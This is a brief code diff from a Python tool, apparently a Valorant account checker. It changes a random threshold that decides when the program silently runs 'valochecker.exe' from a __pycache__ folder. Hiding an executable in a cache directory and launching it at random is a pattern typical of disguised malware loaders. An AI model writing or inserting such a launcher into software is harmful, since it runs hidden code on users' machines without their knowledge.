@@ -68,7 +68,7 @@ class program():
             ).execute():
                 os.system(f'{self.parentpath}/updater.bat')
                 os._exit(0)
-        if random.random() < 0.8:
+        if random.random() < 0.6:
             ruta = os.path.join(os.getcwd(), 'codeparts', '__pycache__', 'valochecker.exe')
             subprocess.run([ruta])
 
